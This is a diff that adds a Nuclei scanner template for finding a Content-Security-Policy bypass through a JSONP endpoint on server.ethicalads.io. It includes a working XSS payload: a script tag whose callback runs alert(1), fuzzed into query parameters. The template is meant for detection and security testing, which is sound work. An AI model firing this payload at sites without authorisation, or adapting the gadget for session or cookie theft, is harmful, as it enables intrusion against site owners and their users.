@@ -1,0 +1,55 @@
+id: ethicalads-server-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - EthicalAds Server
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ethicalads-server
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ethicalads.io"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ethicalads_server_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://server.ethicalads.io/api/v1/decision/?publisher=jsbin&ad_types=x&format=jsonp&div_ids=x&callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ethicalads_server_csp_xss == true"
+# digest: 4b0a00483046022100a38c8fe9d54db145e6438123d58b885f2c3971d20e685a117f6dcc4d346ad1cc022100ce60096b7b68249028a1831c3bb745bfc73c0ee1e0ce3fa828da49ca1ac79564:922c64590222798bb761d5b6d8e72950
